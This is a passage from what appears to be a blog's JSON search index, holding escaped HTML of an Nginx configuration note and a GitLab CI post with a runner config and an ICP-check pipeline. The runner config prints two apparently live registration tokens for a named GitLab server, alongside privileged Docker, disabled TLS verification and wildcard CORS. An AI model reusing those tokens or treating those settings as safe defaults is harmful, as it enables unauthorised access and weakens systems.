style=\"color:#75715e\"\u003e## 是否啟用 gzip 壓縮，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定要壓縮的 Content-Length 最小值，預設為 20\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_min_length\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定壓縮緩衝大小，預設為一頁記憶體\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## gzip_buffers number size;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_buffers\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e32k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定壓縮等級，範圍 1 ~ 9，預設為 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_comp_level\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定要壓縮的 MIME 類型，預設為 text/html\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_types\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/plain\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/x-javascript\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/css\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/xml\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/javascript\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/x-httpd-php\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否在 HTTP response header 增加 Vary: Accept-Encoding，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_vary\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 針對特定 User-Agent 禁用壓縮\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方為設定禁用 IE 6\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_disable\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;MSIE\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[1-6]\\.\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## resolver address ... [valid=time] [ipv6=on|off] [status_zone=zone]; 使用指定的 NS 解析 server_name, upstream server 等\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eresolver\u003c/span\u003e 114.114.114.114 8.8.8.8 1.1.1.1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_headers_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## add_header name value [always]; 在 HTTP response header 增加欄位\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方為設定允許跨域\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Allow-Origin\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e*\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Allow-Headers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eDNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Allow-Methods\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eGET,POST,OPTIONS\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Expose-Headers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;WWW-Authenticate,Server-Authorization,User-Identity-Token\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_realip_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## set_real_ip_from address | CIDR | unix:; 設定信任的可被替代的伺服器 IP，如反向代理伺服器\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eset_real_ip_from\u003c/span\u003e 10.0.0.0\u003cspan style=\"color:#e6db74\"\u003e/8\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eset_real_ip_from\u003c/span\u003e 172.16.0.0\u003cspan style=\"color:#e6db74\"\u003e/12\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eset_real_ip_from\u003c/span\u003e 192.168.0.0\u003cspan style=\"color:#e6db74\"\u003e/16\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## real_ip_header field | X-Real-IP | X-Forwarded-For | proxy_protocol; 定義使用哪個標頭取代獲取到的 client IP，預設為 X-Real-IP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003ereal_ip_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 將 real_ip_header 設定的標頭中，「最後一個非信任伺服器 IP」或是「最後一個 IP」當成真實 IP，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003ereal_ip_recursive\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_log_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## log_format name [escape=default|json|none] string ...; 設定日誌格式\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elog_format\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eescape=json\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003e\u0026#34;@timestamp\u0026#34;:\u0026#34;$time_iso8601\u0026#34;,\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;@source\u0026#34;:\u0026#34;\u003c/span\u003e$server_addr\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;ip\u0026#34;:\u0026#34;\u003c/span\u003e$http_x_forwarded_for\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;client\u0026#34;:\u0026#34;\u003c/span\u003e$remote_addr\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;request_method\u0026#34;:\u0026#34;\u003c/span\u003e$request_method\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;scheme\u0026#34;:\u0026#34;\u003c/span\u003e$scheme\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;domain\u0026#34;:\u0026#34;\u003c/span\u003e$server_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;client_host\u0026#34;:\u0026#34;\u003c/span\u003e$host\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;referer\u0026#34;:\u0026#34;\u003c/span\u003e$http_referer\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;request\u0026#34;:\u0026#34;\u003c/span\u003e$request_uri\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;args\u0026#34;:\u0026#34;\u003c/span\u003e$args\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;sent_bytes\u0026#34;:\u003c/span\u003e$body_bytes_sent,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;status\u0026#34;:\u003c/span\u003e$status,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;responsetime\u0026#34;:\u003c/span\u003e$request_time,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;upstreamtime\u0026#34;:\u0026#34;\u003c/span\u003e$upstream_response_time\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;upstreamaddr\u0026#34;:\u0026#34;\u003c/span\u003e$upstream_addr\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;http_user_agent\u0026#34;:\u0026#34;\u003c/span\u003e$http_user_agent\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;Country\u0026#34;:\u0026#34;\u003c/span\u003e$geoip2_data_country_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;State\u0026#34;:\u0026#34;\u003c/span\u003e$geoip2_data_state_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;City\u0026#34;:\u0026#34;\u003c/span\u003e$geoip2_data_city_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;https\u0026#34;:\u0026#34;\u003c/span\u003e$https\u0026#34;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elog_format\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emain\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$remote_addr \u003cspan style=\"color:#e6db74\"\u003e-\u003c/span\u003e $remote_user \u003cspan style=\"color:#e6db74\"\u003e[\u003c/span\u003e$time_local] \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$request\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$status $body_bytes_sent \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_referer\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e$http_user_agent\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_x_forwarded_for\u0026#34;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]]; 設定日誌寫入位置以及使用的日誌名稱\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## access_log off; 不紀錄日誌\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003elogs/access.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Nginx","config"],"title":"Nginx notes"},{"categories":["Gitlab","CI"],"contents":"Gitlab CI Concept Gitlab DevOps GitOps Workflow code push -\u0026gt; pipeline -\u0026gt; stage -\u0026gt; job Design plan -\u0026gt; code -\u0026gt; build -\u0026gt; test -\u0026gt; release -\u0026gt; deploy -\u0026gt; operate -\u0026gt; monitor -\u0026gt; plan Runner Executors Shell VirtualBox Docker Docker Machine Kubernetes Else\u0026hellip; References Gitlab CI/CD Gitlab Runner .gitlab-ci.yaml Runner Register gitlab-runner register\nAfter register concurrent = 1 check_interval = 0 [session_server] session_timeout = 1800 [[runners]] name = \u0026#34;public-shell\u0026#34; url = \u0026#34;https://gitlab.go2cloudten.com/\u0026#34; token = \u0026#34;-mdH9OAOzG5yPsf_AVnW\u0026#34; executor = \u0026#34;shell\u0026#34; [[runners]] name = \u0026#34;public-docker\u0026#34; url = \u0026#34;https://gitlab.go2cloudten.com/\u0026#34; token = \u0026#34;AcEGPPKTS1uuQ_A_qpWy\u0026#34; executor = \u0026#34;docker\u0026#34; [runners.docker] dns = [\u0026#34;192.168.185.5\u0026#34;, \u0026#34;192.168.185.6\u0026#34;] tls_verify = false image = \u0026#34;registry.go2cloudten.com/it/office_sop/node:12.13.0\u0026#34; privileged = true disable_entrypoint_overwrite = false oom_kill_disable = false disable_cache = false shm_size = 0 pull_policy = \u0026#34;if-not-present\u0026#34; volumes = [\u0026#34;/cache\u0026#34;] Repository .gitlab-ci.yaml stages: - domain check-icp: stage: domain image: registry.go2cloudten.com/it/office_sop/icp tags: - docker script: - domains=$(awk -F \u0026#39;|\u0026#39; \u0026#39;{if($6 ~ \u0026#34;Y\u0026#34; \u0026amp;\u0026amp; ($7 ~ \u0026#34;West\u0026#34; || $7 ~ \u0026#34;Yuqu\u0026#34;)) print $3}\u0026#39; domains-info.md | sed \u0026#39;s/ //g\u0026#39; | sort | uniq) - if [[ \u0026#34;${domains}\u0026#34; == \u0026#34;\u0026#34; ]]; then telegram.sh \u0026#39;There is no domain in list\u0026#39; ; else telegram.sh \u0026#39;Start checking ICP.\u0026#39; ; fi - for i in ${domains}; do result=$(checkicp ${i}); if [[ \u0026#34;${result}\u0026#34; == \u0026#34;未备案\u0026#34; ]];then telegram.sh \u0026#34;${i} 未备案\u0026#34;; sleep 1 ;fi;done - telegram.sh \u0026#39;ICP check completed.\u0026#39; only: - schedules ","date":"September 24, 2021","hero":"/posts/20210924-gitlab/gitlab.png","permalink":"https://linzeyan.github.io/posts/20210924-gitlab/","summary":"\u003ch1 id=\"gitlab-ci\"\u003eGitlab CI\u003c/h1\u003e\n\u003ch2 id=\"concept\"\u003eConcept\u003c/h2\u003e\n\u003ch3 id=\"gitlab\"\u003eGitlab\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eDevOps\u003c/li\u003e\n\u003cli\u003eGitOps\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"workflow\"\u003eWorkflow\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecode push -\u0026gt; pipeline -\u0026gt; stage -\u0026gt; job\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"design\"\u003eDesign\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eplan -\u0026gt; code -\u0026gt; build -\u0026gt; test -\u0026gt; release -\u0026gt; deploy -\u0026gt; operate -\u0026gt; monitor -\u0026gt; plan\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"runner-executors\"\u003eRunner Executors\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eShell\u003c/li\u003e\n\u003cli\u003eVirtualBox\u003c/li\u003e\n\u003cli\u003eDocker\u003c/li\u003e\n\u003cli\u003eDocker Machine\u003c/li\u003e\n\u003cli\u003eKubernetes\u003c/li\u003e\n\u003cli\u003eElse\u0026hellip;\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"references\"\u003eReferences\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://docs.gitlab.com/ee/ci/\" target=\"_blank\" rel=\"noopener\"\u003eGitlab CI/CD\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.gitlab.com/runner/\" target=\"_blank\" rel=\"noopener\"\u003eGitlab Runner\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.gitlab.com/ee/ci/yaml/\" target=\"_blank\" rel=\"noopener\"\u003e.gitlab-ci.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"runner\"\u003eRunner\u003c/h2\u003e\n\u003ch3 id=\"register\"\u003eRegister\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003egitlab-runner register\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"after-register\"\u003eAfter register\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-toml\" data-lang=\"toml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003econcurrent\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003echeck_interval\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[\u003cspan style=\"color:#a6e22e\"\u003esession_server\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003esession_timeout\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1800\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[[\u003cspan style=\"color:#a6e22e\"\u003erunners\u003c/span\u003e]]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;public-shell\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://gitlab.go2cloudten.com/\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003etoken\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-mdH9OAOzG5yPsf_AVnW\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eexecutor\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shell\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[[\u003cspan style=\"color:#a6e22e\"\u003erunners\u003c/span\u003e]]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;public-docker\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://gitlab.go2cloudten.com/\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003etoken\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AcEGPPKTS1uuQ_A_qpWy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eexecutor\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;docker\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  [\u003cspan style=\"color:#a6e22e\"\u003erunners\u003c/span\u003e.\u003cspan 